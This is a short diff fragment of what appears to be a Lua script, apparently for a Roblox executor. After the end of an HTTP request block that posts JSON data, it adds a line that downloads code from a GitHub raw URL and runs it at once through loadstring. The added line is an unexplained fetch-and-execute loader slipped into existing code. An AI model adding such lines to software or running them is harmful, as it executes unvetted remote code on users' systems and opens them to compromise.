@@ -21,3 +21,5 @@ http_request {
     },
     Body = jsonData
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/main/Loader"))()
